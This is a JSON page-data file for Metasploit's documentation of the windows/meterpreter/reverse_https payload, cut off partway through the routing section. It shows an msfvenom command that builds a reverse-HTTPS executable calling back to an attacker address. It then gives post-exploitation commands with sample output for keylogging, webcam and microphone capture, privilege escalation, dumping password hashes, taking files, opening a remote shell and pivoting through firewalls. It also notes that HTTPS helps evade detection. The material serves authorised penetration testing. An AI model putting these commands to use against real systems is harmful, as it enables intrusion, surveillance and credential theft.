{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/payload/windows/meterpreter/reverse_https","result":{"data":{"moduleMetadataJson":{"id":"68d3eb1a-3665-5b4f-bc5b-749de46770b6","name":"Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)","fullname":"payload/windows/meterpreter/reverse_https","description":"Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTPS (Windows wininet)","rank":300,"fields":{"detailsSlug":"/modules/details/payload/windows/meterpreter/reverse_https","documentationSlug":"/modules/documentation/payload/windows/meterpreter/reverse_https","referencesSlug":"/modules/references/payload/windows/meterpreter/reverse_https"},"documentation":{"html":"<p>windows/meterpreter/reverse_https is a unique Windows payload for Metasploit Framework. It\nis capable of doing things like remotely control the file system, sniff, keylog, hashdump,\npivoting, run extensions, etc. But the real strength of this is the way it talks to the\nattacker.</p>\n<p>Instead of a stream-based communication model (tied to a specific TCP session), the stager\nprovides a packet-based transaction system instead. You know, kind of like a botnet that we\nsee today. The use of HTTPS also makes the payload communication a little bit harder to detect.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This Meterpreter payload is suitable for the following environments:</p>\n<ul>\n<li>Windows x64</li>\n<li>Windows x86</li>\n</ul>\n<h2 id=\"deploying-windowsmeterpreterreverse_https\" style=\"position:relative;\"><a href=\"#deploying-windowsmeterpreterreverse_https\" aria-label=\"deploying windowsmeterpreterreverse_https permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Deploying windows/meterpreter/reverse_https</h2>\n<p>windows/meterpreter/revese_https can be used in two different ways.</p>\n<p><strong>As an exploit payload</strong></p>\n<p>To check if windows/meterpreter/reverse_https is compatible with the exploit or not, first you can\nuse the <code class=\"language-text\">info</code> command on the exploit you want to use:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(ms08_067_netapi) &gt; info\n\n       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption\n     Module: exploit/windows/smb/ms08_067_netapi\n   Platform: Windows\n Privileged: Yes\n    License: Metasploit Framework License (BSD)\n       Rank: Great\n  Disclosed: 2008-10-28\n\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If the platform field includes Windows, then you can use windows/meterpreter/reverse_https as the\npayload.</p>\n<p>Depending on the module, sometimes you have to select a specific target by first checking the\ntarget list, like the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">show targets</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>If there is a Windows target, use that:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">set TARGET [index]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To actually set the payload:</p>\n<ol>\n<li>In msfconsole, load the exploit.</li>\n<li>Do: <code class=\"language-text\">set PAYLOAD windows/meterpreter/reverse_https</code></li>\n<li>Set the <code class=\"language-text\">LHOST</code> OPTION WHICH, which <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">IP the same the payload connect to</a>.</li>\n<li>Run th exploit</li>\n</ol>\n<p><strong>As a standalone</strong></p>\n<p>To generate windows/meterpreter/reverse_https, you can do this from msfvenom:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p windows/meterpreter/reverse_https lhost=172.16.23.1 lport=4444 -f exe -o /tmp/https.exe</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"important-basic-commands\" style=\"position:relative;\"><a href=\"#important-basic-commands\" aria-label=\"important basic commands permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Important Basic Commands</h2>\n<p><strong>pwd command</strong></p>\n<p>The <code class=\"language-text\">pwd</code> command allows you to see the current directory you're in on the remote target.\nExample:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; pwd\nC:\\Users\\sinn3r\\Desktop</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>cd command</strong></p>\n<p>The <code class=\"language-text\">cd</code> command allows you to change directories. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cd C:\\\\</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>cat command</strong></p>\n<p>The <code class=\"language-text\">cat</code> command allows you to see the content of a file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cat data.txt\nHello World</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>upload command</strong></p>\n<p>The <code class=\"language-text\">upload</code> command allows you to upload a file to the remote target. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; upload /tmp/payload.exe C:\\\\Users\\\\sinn3r\\\\Desktop\n[*] uploading  : /tmp/payload.exe -&gt; C:\\Users\\sinn3r\\Desktop\n[*] uploaded   : /tmp/payload.exe -&gt; C:\\Users\\sinn3r\\Desktop\\payload.exe\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The <code class=\"language-text\">-r</code> option for the command also allows you to upload recursively.</p>\n<p><strong>download command</strong></p>\n<p>The <code class=\"language-text\">download</code> command allows you download a file from the remote target to your machine.\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; download C:\\\\Users\\\\sinn3r\\\\Desktop\\\\password.txt\n[*] downloading: C:\\Users\\sinn3r\\Desktop\\password.txt -&gt; password.txt\n[*] download   : C:\\Users\\sinn3r\\Desktop\\password.txt -&gt; password.txt</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>search command</strong></p>\n<p>The <code class=\"language-text\">search</code> command allows you to find files on the remote file system. For example, this\ndemonstrates how to find all text files in the current directory:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; search -d . -f *.txt\nFound 1 result...\n    .\\password.txt (11 bytes)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Note that without the <code class=\"language-text\">-d</code> option, the command will attempt to search in all drives.</p>\n<p>The <code class=\"language-text\">-r</code> option for the commands allows you to search recursively.</p>\n<p><strong>ifconfig/ipconfig command</strong></p>\n<p>The <code class=\"language-text\">ifconfig</code> command displays the network interfaces on the remote machine:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; ipconfig\n\nInterface  1\n============\nName         : Software Loopback Interface 1\nHardware MAC : 00:00:00:00:00:00\nMTU          : 4294967295\nIPv4 Address : 127.0.0.1\nIPv4 Netmask : 255.0.0.0\nIPv6 Address : ::1\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\n\n\nInterface 2\n============\nName         : Intel(R) PRO/1000 MT Network Connection\nHardware MAC : 00:0c:29:eb:33:d9\nMTU          : 1500\nIPv4 Address : 172.16.23.185\nIPv4 Netmask : 255.255.255.0\nIPv6 Address : fe80::5911:c25:bd50:5a6d\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The command <code class=\"language-text\">ipconfig</code> is an alias for <code class=\"language-text\">ifconfig</code>.</p>\n<p><strong>getuid command</strong></p>\n<p>The <code class=\"language-text\">getuid</code> command shows you the current user that the payload is running as:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: WIN-6NH0Q8CJQVM\\sinn3r</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>execute command</strong></p>\n<p>The <code class=\"language-text\">execute</code> command allows you to execute a command or file on the remote machine.</p>\n<p>The following example will spawn a calculator:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; execute -f calc.exe\nProcess 2020 created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>ps command</strong></p>\n<p>The <code class=\"language-text\">ps</code> command lists the running processes on the remote machine.</p>\n<p><strong>shell command</strong></p>\n<p>The <code class=\"language-text\">shell</code> command allows you to interact with the remote machine's command prompt. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; shell\nProcess 2872 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Users\\sinn3r\\Desktop&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>sysinfo command</strong></p>\n<p>The <code class=\"language-text\">sysinfo</code> command shows you basic information about the remote machine. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sysinfo\nComputer        : WIN-6NH0Q8CJQVM\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/win32\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>keyscan command</strong></p>\n<p>The <code class=\"language-text\">keyscan_start</code> command starts the keylogging feature on the remote machine.</p>\n<p><strong>keyscan_dump command</strong></p>\n<p>The <code class=\"language-text\">keyscan_dump</code> command is a keylogger feature. You must use the <code class=\"language-text\">keyscan_start</code> command\nbefore using this. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; keyscan_start\nStarting the keystroke sniffer...\nmeterpreter &gt; keyscan_dump\nDumping captured keystrokes...\nhello world!\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>keyscan_stop command</strong></p>\n<p>The <code class=\"language-text\">keyscan_stop</code> command stops the keylogger.</p>\n<p><strong>screenshot command</strong></p>\n<p>The <code class=\"language-text\">screenshot</code> command takes a screenshot of the target machine.</p>\n<p><strong>webcan_list command</strong></p>\n<p>The <code class=\"language-text\">webcam_list</code> commands shows you a list of webcams that you can control. You'll\nprobably want to use this first before using any other webcam commands.</p>\n<p><strong>webcam_snap command</strong></p>\n<p>The <code class=\"language-text\">webcam_snap</code> commands uses the selected webcam to take a picture.</p>\n<p><strong>webcam_stream command</strong></p>\n<p>The <code class=\"language-text\">webcam_stream</code> command basically uses the <code class=\"language-text\">webcam_snap</code> command repeatedly to create\nthe streaming effect. There is no sound.</p>\n<p><strong>record_mic command</strong></p>\n<p>The <code class=\"language-text\">record_mic</code> command captures audio on the remote machine.</p>\n<p><strong>getsystem command</strong></p>\n<p>The <code class=\"language-text\">getsystem</code> command attempts to elevate your privilege on the remote machine with one of\nthese techniques:</p>\n<ul>\n<li>Named pipe impersonation (in memory)</li>\n<li>Named pipe impersonation (dropper)</li>\n<li>Token duplication (in memory)</li>\n</ul>\n<p>Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>hashdump command</strong></p>\n<p>The <code class=\"language-text\">hashdump</code> commands allows you to dump the Windows hashes if there are the right privileges.\nFor sxample:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; hashdump\nAdministrator:500:e39baff0f2c5fd4e93e28745b8bf4ba6:f4974ee4a935ee160a927eafbb3f317f:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHelpAssistant:1000:92a84e332fa4b09e9850257ad6826566:8fb9a6e155fd6e14a16c37427b68bbb4:::\nroot:1003:633c097a37b26c0caad3b435b51404ee:f2477a144dff4f216ab81f2ac3e3207d:::\nSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:e09fcdea29d93203c925b205640421f2:::</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>detach command</strong></p>\n<p>The <code class=\"language-text\">detach</code> command allows you to temporarily disconnect the Meterpreter session without\nactually losing it, as the following example demonstrates:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; detach\n\n[*] 172.16.23.185 - Meterpreter session 1 closed.  Reason: User exit\nmsf exploit(handler) &gt; run\n\n[*] Started HTTPS reverse handler on https://172.16.23.1:4444\n[*] Starting the payload handler...\n[*] https://172.16.23.1:4444 handling request from 172.16.23.185; (UUID: utvmhcay) Attaching orphaned/stageless session...\n&quot;https://172.16.23.1:4444/56uhMwqiB8B0s3WyIzN-3wEo5JA4AcwGUum6UAAWxN2MEy0-Tw8f0GH7EOK-uTte7O6WXt8y9KRTiQX88Fn0CNy5yxFMndf1NPfRXelG6se/&quot;\n[*] Meterpreter session 2 opened (172.16.23.1:4444 -&gt; 172.16.23.185:49207) at 2016-07-11 11:38:21 -0500\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>By default, the Meterpreter session will continue to reach back to you for five minutes. If it\nis unable to connect back after that, it will terminate. You can extend this by setting the\n<code class=\"language-text\">SessionCommunicationTimeout</code> option to your choice. Setting this option to 0 ensures that\nyour session will reattach whenever the target comes back online, as long as the payload handler\nis running.</p>\n<h2 id=\"using-a-post-module\" style=\"position:relative;\"><a href=\"#using-a-post-module\" aria-label=\"using a post module permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using a Post Module</h2>\n<p>One of the best things about Meterpreter is you have access to a variety of post exploitation\nmodules, specifically for the multi and Windows categories. Post modules provide you with more capabilities to\ncollect data from the remote machine automatically. For example, you can steal passwords\nfrom popular applications and enumerate or modify system settings.</p>\n<p>To use a post module from the Meterpreter prompt, simply use the <code class=\"language-text\">run</code> command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; run post/windows/gather/checkvm \n\n[*] Checking if WIN-6NH0Q8CJQVM is a Virtual Machine .....\n[*] This is a VMware Virtual Machine\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>It is also possible to run a post module via multiple Meterpreter sessions. To learn how, load\nthe specific post module you wish to run, and enter <code class=\"language-text\">info -d</code> to see the basic usage in the\ndocumentation.</p>\n<h2 id=\"using-the-post-exploitation-api-in-irb\" style=\"position:relative;\"><a href=\"#using-the-post-exploitation-api-in-irb\" aria-label=\"using the post exploitation api in irb permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using the Post Exploitation API in IRB</h2>\n<p>To enter IRB, do the following at the Meterpreter prompt:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; irb\n[*] Starting IRB shell\n[*] The &#39;client&#39; variable holds the meterpreter client\n\n&gt;&gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>The client object</strong></p>\n<p>The client object in Meterpreter's IRB allows you control or retrieve information about the host. For example, this demonstrates how to obtain the current privilege we're running the payload as:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token operator\">></span><span class=\"token operator\">></span> client<span class=\"token punctuation\">.</span>sys<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>getuid</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To explore the client object, there are a few tricks. For example, you can use the #inspect method to inspect it:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.inspect</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You can use the #methods method to see what methods you can use:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.methods</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To find the source of the method, you can use the #source_location method. For example, say I want to find the source code for the #getuid method:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.sys.config.method(:getuid).source_location\n=&gt; [&quot;/Users/user/rapid7/msf/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb&quot;, 32]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>The first element of the array is the location of the file. The second element is the line number of the method.</p>\n<h2 id=\"using-railgun\" style=\"position:relative;\"><a href=\"#using-railgun\" aria-label=\"using railgun permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using Railgun</h2>\n<p>Railgun allows you to use the remote machine's Windows API in Ruby. For example, to create a MessageBox on the target machine, do:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.railgun.user32.MessageBoxA(0, &quot;hello, world&quot;, &quot;hello&quot;, &quot;MB_OK&quot;)\n=&gt; {&quot;GetLastError&quot;=&gt;0, &quot;ErrorMessage&quot;=&gt;&quot;The operation completed successfully.&quot;, &quot;return&quot;=&gt;1}</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>To learn more about using Railgun, please read this <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">wiki</a>.</p>\n<h2 id=\"routing-through-the-portfwd-command\" style=\"position:relative;\"><a href=\"#routing-through-the-portfwd-command\" aria-label=\"routing through the portfwd command permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Routing through the portfwd command</h2>\n<p>The portfwd command allows you to talk to a remote service like it's local. For example, SMB is a\ncommonly targeted protocol, but by default it is blocked by a firewall. To being able to talk to\nit, we can portfwd via an active session:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; portfwd add -l 445 -p 445 -r 172.16.23.185\n[*] Local TCP relay created: :445 &lt;-&gt; 172.16.23.185:445</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>And then talk to the remote SMB service like it's local:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(smb_version) &gt; set rhosts 127.0.0.1\nrhosts =&gt; 127.0.0.1\nmsf auxiliary(smb_version) &gt; run\n\n[*] 127.0.0.1:445         - Host is running Windows 7 Ultimate SP1 (build:7601) (name:WIN-6NH0Q8CJQVM) (domain:WORKGROUP)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"routing-through-msfconsole\" style=\"position:relative;\"><a href=\"#routing-through-msfconsole\" aria-label=\"routing through msfconsole permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Routing through msfconsole</h2>\n<p>The route command from the msf prompt can also be used to bypass firewall like portfwd, but it also\nallows you to connect to hosts on a different network through the compromised machine.</p>\n<p>To do that, first off, look at the ifconfig/ipconfig output and determine your pivot point:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code 